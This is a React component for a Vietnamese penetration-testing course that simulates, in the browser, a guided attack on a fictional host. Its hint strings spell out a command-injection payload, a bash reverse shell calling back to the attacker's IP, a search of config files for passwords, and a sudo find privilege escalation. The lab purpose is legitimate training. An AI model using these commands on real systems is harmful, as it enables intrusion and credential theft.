import { useEffect, useMemo, useRef, useState, type FormEvent } from 'react';
import SimHow from './SimHow';

type Identity = 'kali' | 'www-data' | 'jdoe' | 'root';
type Pending = 'jdoe-password' | null;

interface Runtime {
  facts: Set<string>;
  identity: Identity;
  pending: Pending;
}

interface TerminalLine {
  prompt: string;
  command: string;
  output: string;
  tone?: 'good' | 'warn' | 'bad';
}

interface ScenarioAction {
  id: string;
  phase: string;
  goal: string;
  needs?: string[];
  identity?: Identity;
  matches: (command: string) => boolean;
  output: string;
  nextIdentity?: Identity;
  pending?: Pending;
  hints: string[];
}

const ACTIONS: ScenarioAction[] = [
  {
    id: 'scan',
    phase: 'Khám phá',
    goal: 'Quét máy 10.10.14.30 xem đang mở những cổng nào trước khi chọn hướng đi sâu.',
    matches: (c) => c.includes('nmap') && c.includes('10.10.14.30'),
    output: 'PORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n445/tcp  open  microsoft-ds',
    hints: [
      'Đừng đoán mò lỗ hổng khi mới chỉ có địa chỉ IP. Hãy dùng nmap xem máy đang lắng nghe ở những cổng nào.',
      'Quét nhanh toàn bộ 65535 cổng TCP là bước khởi đầu chuẩn xác nhất.',
      'Gõ thử: nmap -p- --min-rate 2000 10.10.14.30',
    ],
  },
  {
    id: 'paths',
    phase: 'Liệt kê',
    goal: 'Dò tìm các thư mục ẩn trên dịch vụ web (cổng 80) mà trang chủ không đặt liên kết.',
    needs: ['scan'],
    matches: (c) => (c.includes('gobuster') || c.includes('feroxbuster') || c.includes('ffuf')) && c.includes('10.10.14.30'),
    output: '/index.html  (Status: 200)\n/tools       (Status: 301)\n/robots.txt  (Status: 200)',
    hints: [
      'Trong ba cổng 22, 80, 445 thì cổng 80 (web) là nơi dễ có chức năng tự viết bị lỗi nhất.',
      'Hãy dùng gobuster với một danh sách từ (wordlist) phổ biến để tìm đường dẫn ẩn.',
      'Gõ thử: gobuster dir -u http://10.10.14.30 -w /usr/share/wordlists/dirb/common.txt',
    ],
  },
  {
    id: 'tool',
    phase: 'Liệt kê',
    goal: 'Xem mã HTML của thư mục /tools vừa tìm được để biết trang đó nhận đầu vào gì.',
    needs: ['paths'],
    matches: (c) => c.includes('curl') && c.includes('10.10.14.30/tools'),
    output: '<h2>Công cụ nội bộ: Kiểm tra kết nối</h2>\n<form action="ping.php"> IP: <input name="ip"> </form>',
    hints: [
      'Kết quả gobuster vừa báo có thư mục /tools (Status: 301) rất đáng vào xem.',
      'Dùng curl để lấy nội dung HTML của /tools/ về đọc biểu mẫu (form) và tên tham số.',
      'Gõ thử: curl -s http://10.10.14.30/tools/',
    ],
  },
  {
    id: 'probe',
    phase: 'Kiểm chứng',
    goal: 'Kiểm tra xem tham số ip của ping.php có bị ghép thẳng vào lệnh hệ điều hành không (command injection).',
    needs: ['tool'],
    matches: (c) =>
      c.includes('ping.php') &&
      (c.includes('id') || c.includes('whoami')) &&
      (c.includes(';') || c.includes('%3b') || c.includes('|') || c.includes('&&')),
    output: 'PING 127.0.0.1 ... 1 packets transmitted\nuid=33(www-data) gid=33(www-data) groups=33(www-data)',
    hints: [
      'Trang ping.php nhận địa chỉ IP rồi gọi lệnh ping của hệ thống — đây là chỗ kinh điển dễ dính lỗi tiêm lệnh (command injection).',
      'Hãy nối thêm dấu chấm phẩy (;id) ngay sau địa chỉ 127.0.0.1 để xem máy chủ có chạy lệnh id theo không.',
      "Gõ thử: curl 'http://10.10.14.30/tools/ping.php?ip=127.0.0.1;id'",
    ],
  },
  {
    id: 'listener',
    phase: 'Đường vào',
    goal: 'Mở sẵn cổng lắng nghe (listener) 443 trên máy Kali trước khi bắn kết nối reverse shell về.',
    needs: ['probe'],
    identity: 'kali',
    matches: (c) => (c.includes('nc ') || c.includes('ncat ')) && c.includes('-l') && c.includes('443'),
    output: 'listening on [any] 443 ...',
    hints: [
      'Bạn đã xác nhận chạy được lệnh qua ping.php; giờ hãy lấy một phiên shell tương tác ổn định hơn.',
      'Trước khi bảo máy mục tiêu gọi ngược về Kali (10.10.14.7), bạn phải bật netcat lắng nghe ở cổng 443 đã.',
      'Gõ thử: nc -lvnp 443',
    ],
  },
  {
    id: 'shell',
    phase: 'Đường vào',
    goal: 'Gửi lệnh reverse shell qua ping.php để bắt lấy shell www-data trên máy mục tiêu.',
    needs: ['probe', 'listener'],
    identity: 'kali',
    matches: (c) => c.includes('ping.php') && (c.includes('bash') || c.includes('/dev/tcp') || c.includes('nc ') || c.includes('sh ')),
    output: 'connect to [10.10.14.7] from 10.10.14.30\nwww-data@megacorp:/var/www/html/tools$ id\nuid=33(www-data) gid=33(www-data)',
    nextIdentity: 'www-data',
    hints: [
      'Cổng lắng nghe 443 đã chờ sẵn. Giờ hãy gửi lệnh mở reverse shell qua tham số ip của ping.php.',
      'Bạn có thể dùng bash kết nối ngược về /dev/tcp/10.10.14.7/443.',
      'Gõ thử: curl "http://10.10.14.30/tools/ping.php?ip=127.0.0.1;bash -c \'bash -i >& /dev/tcp/10.10.14.7/443 0>&1\'"',
    ],
  },
  {
    id: 'config',
    phase: 'Leo thang',
    goal: 'Lục tìm mật khẩu để lộ trong các file cấu hình web dưới /var/www trước khi nghĩ tới hướng phức tạp.',
    needs: ['shell'],
    identity: 'www-data',
    matches: (c) =>
      (c.includes('grep') && (c.includes('/var/www') || c.includes('config.php') || c.includes('..')) && (c.includes('pass') || c.includes('db'))) ||
      (c.includes('cat') && c.includes('config.php')),
    output: '/var/www/html/config.php:$db_pass = "S3cr3t!2024";',
    hints: [
      'Bạn đang đứng ngay trong thư mục web với quyền www-data. Các file cấu hình ứng dụng ở quanh đây rất hay chứa mật khẩu cơ sở dữ liệu.',
      'Hãy dùng grep tìm từ khoá "password" trong /var/www/ hoặc đọc file /var/www/html/config.php.',
      'Gõ thử: grep -riI "password" /var/www/ 2>/dev/null',
    ],
  },
  {
    id: 'user',
    phase: 'Leo thang',
    goal: 'Thử dùng lại mật khẩu vừa nhặt được để chuyển sang tài khoản người dùng thật (jdoe) trên máy.',
    needs: ['config'],
    identity: 'www-data',
    matches: (c) => /^su(?:\s+-)?\s+jdoe$/.test(c),
    output: 'Password:',
    pending: 'jdoe-password',
    hints: [
      'Quản trị viên rất hay dùng chung một mật khẩu cho cả cơ sở dữ liệu lẫn tài khoản cá nhân trên máy.',
      'Trên máy này có tài khoản người dùng tên là jdoe. Hãy thử chuyển sang tài khoản đó bằng lệnh su.',
      'Gõ thử: su jdoe (sau đó nhập mật khẩu S3cr3t!2024 khi được hỏi).',
    ],
  },
  {
    id: 'local-proof',
    phase: 'Bằng chứng',
    goal: 'Đọc file cờ người dùng (/home/jdoe/local.txt) để lưu bằng chứng chặng đầu.',
    needs: ['user'],
    matches: (c) => c.includes('cat') && c.includes('local.txt'),
    output: '4aa1b3c7-local-proof',
    hints: [
      'Trong phòng thi OSCP, ngay khi lấy được tài khoản người dùng thường, bạn nên đọc và lưu ngay file local.txt.',
      'File local.txt nằm ngay trong thư mục nhà (/home/jdoe) của jdoe.',
      'Gõ thử: cat /home/jdoe/local.txt',
    ],
  },
  {
    id: 'sudo',
    phase: 'Leo thang',
    goal: 'Kiểm tra xem tài khoản jdoe có được cấp quyền chạy lệnh nào bằng sudo không.',
    needs: ['user'],
    identity: 'jdoe',
    matches: (c) => c === 'sudo -l',
    output: 'User jdoe may run the following commands on megacorp:\n    (root) NOPASSWD: /usr/bin/find',
    hints: [
      'Khi đã có tài khoản người dùng thật, phản xạ đầu tiên luôn là kiểm tra danh sách quyền sudo.',
      'Dùng cờ -l của sudo để liệt kê các lệnh mà jdoe được phép chạy.',
      'Gõ thử: sudo -l',
    ],
  },
  {
    id: 'root',
    phase: 'Chiếm quyền',
    goal: 'Tận dụng quyền sudo trên lệnh find (theo kỹ thuật GTFOBins) để bật ra một shell mang quyền root.',
    needs: ['sudo'],
    identity: 'jdoe',
    matches: (c) =>
      (c.includes('sudo find') || c.includes('sudo /usr/bin/find')) &&
      c.includes('-exec') &&
      (c.includes('/bin/sh') || c.includes('/bin/bash') || c.includes('sh ') || c.includes('bash')),
    output: '# id\nuid=0(root) gid=0(root) groups=0(root)',
    nextIdentity: 'root',
    hints: [
      'Lệnh find cho phép gọi một chương trình khác thông qua tham số -exec.',
      'Khi find chạy bằng quyền root (nhờ sudo NOPASSWD), shell con do nó gọi ra cũng sẽ thừa hưởng quyền root.',
      'Gõ thử: sudo find . -exec /bin/sh \\; -quit',
    ],
  },
  {
    id: 'proof',
    phase: 'Bằng chứng',
    goal: 'Đọc file bằng chứng cuối cùng (/root/proof.txt) từ shell root vừa mở.',
    needs: ['root'],
    identity: 'root',
    matches: (c) => c.includes('cat') && c.includes('proof.txt'),
    output: 'b8f2c6d9-root-proof',
    hints: [
      'Bạn đã nắm quyền cao nhất (root); đừng quên lấy mã bằng chứng bắt buộc trước khi rời máy.',
      'File proof.txt nằm trong thư mục /root.',
      'Gõ thử: cat /root/proof.txt',
    ],
  },
];

const TRACKED = ['scan', 'paths', 'tool', 'probe', 'listener', 'shell', 'config', 'user', 'local-proof', 'sudo', 'root', 'proof'];

function prompt(identity: Identity) {
  if (identity === 'kali') return 'kali@lab:~$';
  if (identity === 'root') return 'root@megacorp:~#';
  if (identity === 'www-data') return 'www-data@megacorp:/var/www/html/tools$';
  return `${identity}@megacorp:~$`;
}

function missing(action: ScenarioAction, state: Runtime) {
  return (action.needs ?? []).filter((fact) => !state.facts.has(fact));
}

function runBuiltin(cmd: string, state: Runtime): string | null {
  if (cmd === 'help') {
    return 'Các lệnh hỗ trợ trong bài tập này: nmap, gobuster, curl, nc, grep, cat, ls, pwd, id, whoami, su, sudo, clear.\nGõ theo mục tiêu hiện tại ở phía trên, hoặc bấm nút "Gợi ý" nếu bạn cần dẫn đường.';
  }
  if (cmd === 'whoami') {
    return state.identity;
  }
  if (cmd === 'id') {
    if (state.identity === 'kali') return 'uid=1000(kali) gid=1000(kali) groups=1000(kali)';
    if (state.identity === 'www-data') return 'uid=33(www-data) gid=33(www-data) groups=33(www-data)';
    if (state.identity === 'jdoe') return 'uid=1000(jdoe) gid=1000(jdoe) groups=1000(jdoe)';
    return 'uid=0(root) gid=0(root) groups=0(root)';
  }
  if (cmd === 'pwd') {
    if (state.identity === 'kali') return '/home/kali';
    if (state.identity === 'www-data') return '/var/www/html/tools';
    if (state.identity === 'jdoe') return '/home/jdoe';
    return '/root';
  }
  if (cmd === 'ls' || cmd === 'ls -l' || cmd === 'ls -la') {
    if (state.identity === 'kali') return 'notes.txt';
    if (state.identity === 'www-data') return 'ping.php   ../config.php';
    if (state.identity === 'jdoe') return 'local.txt';
    return 'proof.txt';
  }
  if (cmd === 'cat /etc/passwd') {
    if (state.identity === 'kali') return 'root:x:0:0:root:/root:/bin/bash\nkali:x:1000:1000::/home/kali:/bin/bash';
    return 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\njdoe:x:1000:1000:John Doe:/home/jdoe:/bin/bash';
  }
  return null;
}

export default function ScenarioLab({ title = 'Tự tay chiếm máy giả lập: megacorp (10.10.14.30)' }: { title?: string }) {
  const [state, setState] = useState<Runtime>({ facts: new Set(), identity: 'kali', pending: null });
  const [mode, setMode] = useState<'guided' | 'exam'>('guided');
  const [reportDone, setReportDone] = useState(false);
  const [input, setInput] = useState('');
  const [lines, setLines] = useState<TerminalLine[]>([
    {
      prompt: 'system',
      command: '',
      output: 'Terminal giả lập chạy ngay trong trình duyệt (gõ help để xem các lệnh hỗ trợ). Không có gói tin hay lệnh nào chạy trên máy thật.',
      tone: 'warn',
    },
  ]);
  const [hint, setHint] = useState(0);
  const terminalRef = useRef<HTMLDivElement>(null);

  const next = useMemo(() => {
    if (state.pending === 'jdoe-password') return null;
    return (
      ACTIONS.find(
        (action) =>
          !state.facts.has(action.id) &&
          missing(action, state).length === 0 &&
          (!action.identity || action.identity === state.identity),
      ) ?? null
    );
  }, [state]);

  const progress = TRACKED.filter((fact) => state.facts.has(fact)).length;
  const localDone = state.facts.has('local-proof');
  const rootDone = state.facts.has('proof');
  const completed = progress + (reportDone ? 1 : 0);
  const currentGoal =
    state.pending === 'jdoe-password'
      ? 'Nhập mật khẩu cho tài khoản jdoe (lấy từ file config.php vừa đọc) rồi nhấn Enter.'
      : next?.goal ??
        (rootDone && !reportDone
          ? 'Bạn đã lấy đủ cờ! Hãy bấm vào mục "Chốt hai mục phát hiện vào báo cáo" ở khung Bằng chứng để hoàn tất bài làm.'
          : rootDone
            ? 'Xin chúc mừng! Bạn đã tự tay đi trọn chuỗi tấn công từ một địa chỉ IP tới quyền root và hoàn tất báo cáo.'
            : 'Hãy xem lại các manh mối đã thu được để đi tiếp.');

  useEffect(() => {
    terminalRef.current?.scrollTo({ top: terminalRef.current.scrollHeight, behavior: 'smooth' });
  }, [lines]);

  function append(command: string, output: string, tone?: TerminalLine['tone']) {
    setLines((previous) => [...previous, { prompt: prompt(state.identity), command, output, tone }]);
  }

  function complete(action: ScenarioAction, command: string) {
    append(command, action.output, 'good');
    setState((previous) => ({
      facts: new Set(previous.facts).add(action.id),
      identity: action.nextIdentity ?? previous.identity,
      pending: action.pending ?? null,
    }));
    setHint(0);
  }

  function submit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const command = input.trim().replace(/\s+/g, ' ');
    setInput('');
    if (!command) return;

    if (state.pending === 'jdoe-password') {
      if (command === 'S3cr3t!2024') {
        append('••••••••••', 'jdoe@megacorp:~$ id\nuid=1000(jdoe) gid=1000(jdoe) groups=1000(jdoe)', 'good');
        setState((previous) => ({ facts: new Set(previous.facts).add('user'), identity: 'jdoe', pending: null }));
        setHint(0);
      } else {
        append('••••••••••', 'su: Authentication failure\nMật khẩu chưa đúng. Hãy kiểm tra lại chuỗi $db_pass trong file config.php.', 'bad');
      }
      return;
    }

    const lowered = command.toLowerCase();
    if (lowered === 'clear') {
      setLines([]);
      return;
    }

    // Cho phép chạy nmap quét sâu (-sC / -sV) sau khi đã quét cổng bước 1, đúng quy trình 2 bước ở bài 2.2.
    if (lowered.includes('nmap') && lowered.includes('10.10.14.30') && (lowered.includes('-sv') || lowered.includes('-sc')) && state.facts.has('scan')) {
      append(
        command,
        '22/tcp  open  ssh          OpenSSH 7.6p1 Ubuntu\n80/tcp  open  http         Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Megacorp Intranet\n445/tcp open  netbios-ssn  Samba smbd 4.7.6',
        'good',
      );
      return;
    }

    const builtin = runBuiltin(lowered, state);
    if (builtin !== null) {
      append(command, builtin);
      return;
    }

    const action = ACTIONS.find((candidate) => candidate.matches(lowered));
    if (!action) {
      append(command, 'Terminal mô phỏng chưa nhận diện được lệnh này. Hãy bám sát mục tiêu hiện tại ở phía trên hoặc bấm nút "Gợi ý".', 'warn');
      return;
    }

    const requirements = missing(action, state);
    if (requirements.length > 0) {
      append(command, 'Ý tưởng hợp lý, nhưng bạn đang nhảy cóc! Hãy làm các bước liệt kê trước đó để tìm ra manh mối dẫn tới lệnh này đã.', 'warn');
      return;
    }
    if (action.identity && action.identity !== state.identity) {
      append(
        command,
        `Lệnh này cần gõ ở ${action.identity === 'kali' ? 'máy Kali' : `phiên shell của ${action.identity}`}, còn bạn đang đứng ở ${state.identity}.`,
        'warn',
      );
      return;
    }
    if (state.facts.has(action.id)) {
      append(command, 'Bước này bạn đã làm xong và có kết quả rồi. Hãy nhìn mục tiêu hiện tại để sang bước kế tiếp.', 'warn');
      return;
    }
    complete(action, command);
  }

  function reset() {
    setState({ facts: new Set(), identity: 'kali', pending: null });
    setReportDone(false);
    setLines([{ prompt: 'system', command: '', output: 'Đã đặt lại từ đầu. Mọi dữ liệu trong mô phỏng này đều là giả.', tone: 'warn' }]);
    setHint(0);
    setInput('');
  }

  return (
    <div className="sim scenario">
      <p className="sim-title">{title}</p>
      <SimHow steps={['Đọc dòng mục tiêu hiện tại, gõ lệnh tương ứng vào khung terminal đen rồi nhấn Enter. Mỗi bước làm đúng sẽ mở khoá bước tiếp theo.', 'Nếu chưa nhớ cú pháp lệnh, hãy bấm nút "Gợi ý" ở góc dưới: gợi ý mở từng nấc từ định hướng tư duy cho tới câu lệnh mẫu.']} />

      <div className="scenario-head">
        <div>
          <p className="scenario-kicker">Mục tiêu: megacorp · 10.10.14.30</p>
          <p className="scenario-goal" aria-live="polite">
            {currentGoal}
          </p>
        </div>
        <span className="scenario-progress">
          {completed}/{TRACKED.length + 1} bước
        </span>
      </div>

      <div className="scenario-modes" aria-label="Chế độ luyện tập">
        <button type="button" className={mode === 'guided' ? 'active' : ''} aria-pressed={mode === 'guided'} onClick={() => setMode('guided')}>
          Có hướng dẫn
        </button>
        <button type="button" className={mode === 'exam' ? 'active' : ''} aria-pressed={mode === 'exam'} onClick={() => setMode('exam')}>
          Thử sức như phòng thi
        </button>
        <span>
          {mode === 'guided'
            ? 'Hiện sơ đồ tiến độ, sổ bằng chứng và nút gợi ý từng bước.'
            : 'Ẩn toàn bộ gợi ý và sơ đồ phụ trợ — chỉ giữ lại terminal như khi làm bài thi thật.'}
        </span>
      </div>

      {mode === 'guided' ? (
        <div className="scenario-grid">
          <section className="scenario-map" aria-label="Tiến độ xâm nhập">
            <p className="cstep-h">Tiến độ xâm nhập</p>
            <div className="scenario-route">
              <div className="scenario-node active">
                <span>Máy của bạn</span>
                <strong>10.10.14.7</strong>
                <small>Kali Linux</small>
              </div>
              <span className="scenario-arrow" aria-hidden="true">
                →
              </span>
              <div className={`scenario-node ${state.facts.has('scan') ? 'active' : ''}`}>
                <span>Mục tiêu</span>
                <strong>10.10.14.30</strong>
                <small>{state.facts.has('scan') ? 'cổng 22 · 80 · 445' : 'chưa quét cổng'}</small>
              </div>
              <span className="scenario-arrow" aria-hidden="true">
                →
              </span>
              <div className={`scenario-node ${state.identity !== 'kali' ? 'owned' : ''}`}>
                <span>Quyền đang nắm</span>
                <strong>{state.identity === 'kali' ? 'Chưa vào máy' : state.identity}</strong>
                <small>{state.identity === 'root' ? 'quyền cao nhất' : state.identity === 'kali' ? 'đứng từ ngoài' : 'đã có shell'}</small>
              </div>
            </div>
            <div className="scenario-findings" aria-label="Manh mối đã tìm ra">
              <span className={state.facts.has('paths') ? 'found' : ''}>Thư mục ẩn /tools</span>
              <span className={state.facts.has('probe') ? 'found' : ''}>Lỗi tiêm lệnh ping.php</span>
              <span className={state.facts.has('config') ? 'found' : ''}>Mật khẩu trong config.php</span>
              <span className={state.facts.has('sudo') ? 'found' : ''}>Quyền sudo find</span>
            </div>
          </section>

          <section className="scenario-evidence" aria-label="Sổ bằng chứng">
            <p className="cstep-h">Sổ bằng chứng</p>
            <p className={localDone ? 'scenario-check done' : 'scenario-check'}>
              <b>{localDone ? '✓' : '○'}</b> Cờ người dùng (local.txt)
            </p>
            <p className={rootDone ? 'scenario-check done' : 'scenario-check'}>
              <b>{rootDone ? '✓' : '○'}</b> Cờ root (proof.txt)
            </p>
            <button
              type="button"
              className={reportDone ? 'scenario-check scenario-report done' : 'scenario-check scenario-report'}
              disabled={!rootDone}
              onClick={() => setReportDone(true)}
            >
              <b>{reportDone ? '✓' : '○'}</b> Chốt hai mục phát hiện vào báo cáo
            </button>
          </section>
        </div>
      ) : (
        <p className="scenario-exam-note">
          Đang bật chế độ phòng thi: hãy tự ghi chép cổng mở, mật khẩu và cờ ra sổ tay riêng của bạn. Bất cứ lúc nào cần kiểm tra lại, bạn vẫn có thể bấm chuyển về chế độ "Có hướng dẫn".
        </p>
      )}

      <div className="scenario-terminal" ref={terminalRef} onClick={() => terminalRef.current?.querySelector('input')?.focus()} aria-label="Terminal giả lập">
        {lines.map((line, index) => (
          <div key={index} className={`scenario-line ${line.tone ?? ''}`}>
            {line.command && (
              <p>
                <span>{line.prompt}</span> {line.command}
              </p>
            )}
            <pre>{line.output}</pre>
          </div>
        ))}
        <form className="scenario-input" onSubmit={submit}>
          <span>{state.pending === 'jdoe-password' ? 'Password:' : prompt(state.identity)}</span>
          <input
            value={input}
            onChange={(event) => setInput(event.target.value)}
            aria-label="Gõ lệnh cho máy giả lập megacorp"
            autoCapitalize="off"
            autoCorrect="off"
            spellCheck={false}
          />
        </form>
      </div>

      <div className="scenario-bottom">
        <div className="scenario-hint" aria-live="polite">
          {mode === 'exam' ? (
            <span className="muted">Chế độ phòng thi không hiển thị gợi ý. Hãy tự suy luận từ kết quả lệnh trước đó.</span>
          ) : next && hint > 0 ? (
            <>
              <strong>
                Gợi ý {hint}/{next.hints.length}:
              </strong>{' '}
              {next.hints[hint - 1]}
            </>
          ) : (
            <span className="muted">Bí bước nào thì bấm "Gợi ý" — mỗi lần bấm sẽ mở thêm một nấc chi tiết hơn.</span>
          )}
        </div>
        <div className="sim-controls">
          <button
            type="button"
            className="btn"
            onClick={() => setHint((current) => Math.min(current + 1, next?.hints.length ?? current))}
            disabled={mode === 'exam' || !next || hint >= next.hints.length}
          >
            Gợi ý
          </button>
          <button type="button" className="btn" onClick={reset}>
            Làm lại
          </button>
        </div>
      </div>
    </div>
  );
}
